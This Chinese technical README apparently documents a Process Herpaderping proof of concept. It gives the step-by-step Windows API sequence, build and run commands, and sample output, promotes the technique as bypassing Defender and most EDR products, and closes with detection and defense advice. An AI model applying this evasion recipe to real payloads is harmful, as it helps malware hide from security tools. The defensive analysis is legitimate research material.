# Process Herpaderping (进程伪装) - 技术文档

> ✅ **测试状态**：此技术在 **Windows 10 上完全有效**
>
> - **成功率**：100%
> - **测试环境**：Windows 10 x64
> - **核心优势**：不依赖事务，比 Process Doppelgänging 更稳定
> - **绕过能力**：可绕过大多数基于文件检查的安全产品

## 技术概述

Process Herpaderping（进程伪装）是由安全研究员 Johnny Shaw 于 2020 年发现的高级代码注入技术。该技术通过在进程创建后修改磁盘文件内容，使安全产品在检查时看到错误的文件内容，从而导致归因错误。

**核心创新**：
- **时序窗口攻击** - 利用 Windows 进程创建的时序差
- **镜像节缓存** - `NtCreateSection` 创建 SEC_IMAGE 节时内容被完全缓存
- **归因错误** - 安全产品检查磁盘文件时看到的不是实际执行的代码
- **无事务依赖** - 比 Process Doppelgänging 简单且更稳定
- **绕过检测** - 可绕过 Windows Defender 和多数 EDR

## 技术原理

### 关键发现：镜像节缓存机制

Windows 在处理 SEC_IMAGE 类型的内存节时有一个关键特性：

```
NtCreateSection(SEC_IMAGE, FileHandle)
     ↓
Windows 读取并验证 PE 文件
     ↓
内容被完全缓存到内核内存
     ↓
内存节对象独立于磁盘文件
     ↓
即使磁盘文件被修改，缓存的节内容不变！
```

**这意味着**：
1. 创建镜像节后，可以修改甚至删除原始文件
2. 从节创建的进程仍然加载缓存的原始内容
3. 安全产品检查磁盘文件时看到的是修改后的内容

### 执行流程

**完整的 10 步流程**：

```
[1] 写入真实载荷到文件
    └─> CreateFile() + WriteFile(payload)

[2] 创建镜像节（内容被缓存）
    └─> NtCreateSection(SEC_IMAGE, hFile)
    └─> Windows 将 PE 内容缓存到内核

[3] 从节创建进程对象
    └─> NtCreateProcessEx(hSection)
    └─> 进程结构创建，但无线程

[4] 覆盖磁盘文件内容（关键步骤！）
    └─> SetFilePointer(hFile, 0)
    └─> WriteFile(0xCC pattern) 或 WriteFile(fake.exe)
    └─> 磁盘文件被修改，但缓存的节未变！

[5] 读取 PEB 获取 ImageBase
    └─> NtQueryInformationProcess()
    └─> NtReadVirtualMemory(PEB)

[6] 设置进程参数
    └─> RtlCreateProcessParametersEx()
    └─> WriteProcessMemory()

[7] 计算入口点
    └─> EntryPoint = ImageBase + EntryRVA
    └─> 从原始载荷（缓存）获取 RVA

[8] 创建线程执行（触发安全回调！）
    └─> NtCreateThreadEx(EntryPoint)
    └─> PsCreateProcessNotifyRoutine 回调触发
    └─> 安全产品在此检查磁盘文件，看到修改后的内容！

[9] 关闭文件句柄
    └─> CloseHandle(hFile)
    └─> IRP_MJ_CLEANUP 触发
    └─> 安全产品再次检查，仍是修改后的内容！

[10] 进程正常执行
     └─> 执行的是缓存中的原始载荷
     └─> 磁盘文件内容已经完全不同
```

### 时序图

```
时间轴 →

步骤1: CreateFile + WriteFile(真实载荷)
       ↓
步骤2: NtCreateSection(SEC_IMAGE)  ← 缓存原始载荷
       ↓
步骤3: NtCreateProcessEx
       ↓
步骤4: WriteFile(覆盖内容)  ← 磁盘文件被修改
       ↓
步骤5-7: 准备进程参数
       ↓
步骤8: NtCreateThreadEx  ← 安全回调触发，检查到覆盖后的文件
       ↓                    （归因错误发生！）
步骤9: CloseHandle  ← IRP_MJ_CLEANUP 触发，仍看到覆盖后的文件
       ↓
步骤10: 进程执行缓存的原始载荷
```

### 与其他技术对比

| 技术 | 执行方式 | 关键依赖 | 文件落地 | Windows 10 状态 |
|------|---------|---------|---------|----------------|
| **Process Hollowing** | 挖空替换 | 目标进程 | 永久 | ✅ 有效 |
| **Transacted Hollowing** | 事务映射 | NTFS 事务 | 临时 | ✅ 有效 |
| **Process Doppelgänging** | 事务创建 | NTFS 事务 | 无 | ❌ 失效（Windows 10+） |
| **Process Herpaderping** | 缓存替换 | 无特殊依赖 | 被覆盖 | ✅ 有效 |

**Herpaderping 的优势**：
1. **不依赖 NTFS 事务** - Doppelgänging 已被部分修复
2. **不需要目标进程** - 比 Hollowing 更灵活
3. **实现简单** - 只需要标准文件操作
4. **兼容性好** - 在 Windows 10 上完全有效
5. **绕过检测** - 安全产品归因错误

## 测试方法

### 环境要求
- **操作系统**: Windows 7 及以上
- **文件系统**: 无特殊要求（支持所有文件系统）
- **编译器**: MinGW-w64 或 MSVC
- **权限**: 普通用户权限即可（部分操作需管理员）
- **架构**: x64（当前实现）

### 编译步骤

**使用批处理脚本（推荐）**：
```bash
cd techniques/04-process-herpaderping
./build.bat
```

输出文件位于 `build/x64/` 目录：
- `process_herpaderping.exe` - 主程序
- `test_payload.exe` - 测试载荷

**手动编译**：
```bash
cd techniques/04-process-herpaderping/src

# 编译主程序
gcc -o ../build/x64/process_herpaderping.exe \
    process_herpaderping.c pe_utils.c \
    -lntdll -luserenv \
    -O2 -municode -DUNICODE

# 编译测试载荷
gcc -o ../build/x64/test_payload.exe test_payload.c -mwindows
```

### 执行测试

**方法1：使用模式覆盖**（推荐用于测试）：
```bash
./build/x64/process_herpaderping.exe build/x64/test_payload.exe build/x64/target.exe
```
- 将 `test_payload.exe` 复制到 `target.exe`
- 创建镜像节
- 用 `0xCC` 模式覆盖 `target.exe`
- 从缓存的节创建进程

**方法2：使用文件覆盖**：
```bash
./build/x64/process_herpaderping.exe build/x64/test_payload.exe build/x64/target.exe C:\Windows\System32\calc.exe
```
- 将 `test_payload.exe` 复制到 `target.exe`
- 创建镜像节
- 用 `calc.exe` 的内容覆盖 `target.exe`
- 从缓存的节创建进程（执行 test_payload）

### 观察要点

**1. 控制台输出**
成功的执行会显示以下关键步骤：
```
[1] 打开源文件
    源文件已打开

[2] 创建目标文件
    目标文件已创建

[3] 复制载荷到目标文件
    载荷已复制

[4] 创建内存节对象（SEC_IMAGE）
    节句柄：0x...
    关键：此时镜像节已被缓存！

[5] 从内存节创建进程（NtCreateProcessEx）
    进程已创建！
    进程 ID：xxxxx

[6] 覆盖目标文件内容（Herpaderping！）
    使用 0xCC 模式覆盖
    已用 0xCC 模式覆盖目标文件

    ★ 关键点：磁盘文件已修改，但缓存的节未变！
    ★ 安全产品检查磁盘时看到的是修改后的内容！

[7] 查询进程基本信息
    PEB 地址：0x...
    镜像基址：0x...

[8] 获取入口点并创建线程
    入口点 VA：0x...

[9] 创建线程（触发进程通知回调）
    线程已创建！

    ★ 此时内核进程通知回调触发！
    ★ 安全产品检查到的是覆盖后的文件！

[10] 关闭文件句柄
     文件句柄已关闭
     ★ IRP_MJ_CLEANUP 触发，检查仍是覆盖后的内容！
```

**2. 文件内容验证**

验证覆盖是否成功：
```bash
# 查看 target.exe 内容（应该全是 0xCC）
od -A x -t x1z -N 128 build/x64/target.exe
# 输出：cc cc cc cc cc cc cc cc ...

# 对比原始 payload（应该是正常的 PE 文件）
od -A x -t x1z -N 128 build/x64/test_payload.exe
# 输出：4d 5a 90 00 ... (MZ 头)
```

**3. 进程行为验证**
- MessageBox 弹出（test_payload 的行为）
- 任务管理器显示进程正在运行
- 进程路径指向被覆盖的 target.exe
- 但执行的是原始 test_payload 的代码

## 预期效果

### ✅ Windows 10 实际表现

**执行结果**（完全成功）：
1. ✅ 创建并复制载荷到目标文件
2. ✅ 创建 SEC_IMAGE 内存节（内容被缓存）
3. ✅ 成功创建进程（NtCreateProcessEx）
4. ✅ 成功覆盖磁盘文件（0xCC 或其他文件）
5. ✅ 正确读取 PEB，获取 ImageBase
6. ✅ 设置进程参数
7. ✅ 成功创建线程（NtCreateThreadEx）
8. ✅ 进程执行原始载荷代码

**实际表现**：
- MessageBox 正常弹出
- 进程正常执行所有功能
- 磁盘文件内容已完全不同（归因错误）
- 安全产品检查磁盘时被欺骗

### 验证归因错误

**安全产品的视角**：

| 检测点 | 看到的内容 | 实际情况 |
|--------|-----------|---------|
| 文件创建 | test_payload.exe | 短暂可见 |
| 进程创建回调 | target.exe (0xCC 或 fake.exe) | 执行 test_payload |
| IRP_MJ_CLEANUP | target.exe (覆盖后) | 已开始执行 |
| 磁盘扫描 | target.exe (覆盖后) | 内存中是原始 payload |
| 签名验证 | 覆盖文件的签名 | 实际执行的是 payload |

**安全产品会误判**：
- 认为进程执行的是覆盖后的文件
- 如果覆盖文件是良性的（如 calc.exe），会被标记为正常
- 无法追溯到真正执行的 payload

## 技术深度分析

### 为什么镜像节缓存不更新？

**Windows 镜像节（SEC_IMAGE）的特性**：

1. **完整性验证**：
   - `NtCreateSection` 创建 SEC_IMAGE 时，Windows 读取并验证整个 PE 文件
   - PE 头、节表、导入表等全部被解析
   - 内容被拷贝到内核内存中的节对象

2. **缓存独立性**：
   ```c
   // 伪代码
   NtCreateSection(SEC_IMAGE, hFile) {
       BYTE* buffer = AllocateKernelMemory(fileSize);
       ReadFile(hFile, buffer, fileSize);  // 一次性读取
       ValidatePE(buffer);                  // 验证 PE 格式
       CreateSectionObject(buffer);         // 创建节对象
       // 节对象已与文件句柄解耦！
       return hSection;
   }
   ```

3. **后续修改无效**：
   - 节对象创建后，与文件句柄无关
   - 修改磁盘文件不会影响已创建的节
   - `NtCreateProcessEx` 使用的是节对象，不是文件

### 为什么安全产品会被欺骗？

**时序问题**：

1. **进程创建回调时机**：
   ```c
   // 内核回调触发点
   NtCreateThreadEx() {
       CreateThread();
       PsCreateProcessNotifyRoutine();  // ← 回调在这里
       ResumeThread();
   }
   ```
   - 回调发生在线程创建时
   - 此时磁盘文件已被覆盖
   - 安全产品读取磁盘文件进行分析

2. **文件清理回调时机**：
   ```c
   CloseHandle(hFile) {
       IRP_MJ_CLEANUP();  // ← 文件系统过滤驱动回调
       // 此时也是覆盖后的内容
   }
   ```

3. **重建困难**：
   - 从内存节重建原始文件需要复杂操作
   - 大多数安全产品不会这样做
   - 性能开销太大

### 检测方法

**可能的检测策略**：

**1. 内核驱动检测**：
```c
// 在 NtCreateSection 时记录文件哈希
OnNtCreateSection(HANDLE FileHandle, ULONG Attributes) {
    if (Attributes & SEC_IMAGE) {
        BYTE hash[32];
        CalculateFileHash(FileHandle, hash);
        StoreMapping(FileHandle, hash);
    }
}

// 在文件修改时检查
OnFileWrite(HANDLE FileHandle) {
    if (HasActiveSectionMapping(FileHandle)) {
        BYTE currentHash[32];
        CalculateFileHash(FileHandle, currentHash);
        if (HashChanged(FileHandle, currentHash)) {
            ALERT("Possible Process Herpaderping");
        }
    }
}
```

**2. 行为模式检测**：
- 监控 "write → map → write" 模式
- 检测文件在 SEC_IMAGE 映射后被修改
- 关联文件操作和进程创建事件

**3. 内存取证**：
- 从节对象重建原始 PE 文件
- 比较内存内容和磁盘文件
- 检测不一致性

## 防御建议

### 对于安全产品开发者

**1. 不要仅依赖磁盘文件**：
- 从进程内存重建原始文件
- 在 `NtCreateSection` 时记录文件哈希
- 验证磁盘文件与内存的一致性

**2. 监控时序异常**：
- 检测 SEC_IMAGE 节创建后的文件修改
- 关联文件句柄和节对象
- 在修改发生时生成警报

**3. 内核层防护**：
- 在文件系统过滤驱动中阻止修改
- 检查文件是否有活动的镜像节映射
- 拒绝对已映射文件的写入操作

### 对于系统管理员

**1. 审计策略**：
- 启用详细的文件审计
- 监控 `NtCreateSection` 系统调用
- 关注文件快速修改模式

**2. 应用白名单**：
- 只允许签名的可执行文件
- 验证文件签名在整个生命周期中保持一致
- 检测签名变更

**3. EDR 配置**：
- 启用内存扫描
- 配置进程创建监控
- 关注异常的文件操作模式

## 已知问题与限制

**1. 架构限制**：
- 当前实现仅支持 x64
- 载荷和主程序必须同架构

**2. 环境变量设置**：
- 某些情况下环境变量分配可能失败
- 不影响主要功能，仅是警告

**3. 检测可能性**：
- 先进的 EDR 可以检测此技术
- 内核驱动可以阻止文件修改
- 不是完全不可检测的

## 参考资料

### 原始披露
- **发现者**: Johnny Shaw
- **披露时间**: 2020年
- **博客文章**: [Process Herpaderping](https://jxy-s.github.io/herpaderping/)
- **MSRC 案例**: 未被认定为需要立即修复的安全问题

### 参考实现
- [jxy-s/herpaderping](https://github.com/jxy-s/herpaderping) - C++ 原始实现

### 相关技术
- [Process Hollowing](./01-process-hollowing.md)
- [Transacted Hollowing](./02-transacted-hollowing.md)
- [Process Doppelgänging](./03-process-doppelganging.md) - 在 Windows 10 已失效

### 技术文章
- [Black Hat USA 2021](https://www.blackhat.com/)
- [Windows Internals - Image Sections](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/section-objects-and-views)

## 总结

Process Herpaderping 是一种极其巧妙的代码注入技术，利用 Windows 镜像节缓存机制和安全产品的时序盲点实现归因错误。

### 技术评估

**优势** ✅：
- **简单实用** - 不依赖特殊机制（如 NTFS 事务）
- **稳定性高** - 在 Windows 10 上完全有效
- **绕过能力强** - 可欺骗大多数基于文件检查的安全产品
- **兼容性好** - 支持所有文件系统

**限制** ⚠️：
- 先进的 EDR 可以检测
- 需要正确实现 PEB 结构
- 留下文件操作痕迹

**实战价值** ⭐⭐⭐⭐⭐：
- 非常高的实战价值
- 比 Process Doppelgänging 更可靠
- 是当前最有效的进程伪装技术之一

**学习价值** ⭐⭐⭐⭐⭐：
- 深入理解 Windows 镜像节机制
- 了解安全产品的检测盲点
- 学习时序攻击的思路
- 研究防御和检测方法

这项技术展示了攻击者如何利用系统的合法功能和时序窗口实现隐蔽攻击，对于理解现代系统安全具有重要价值。
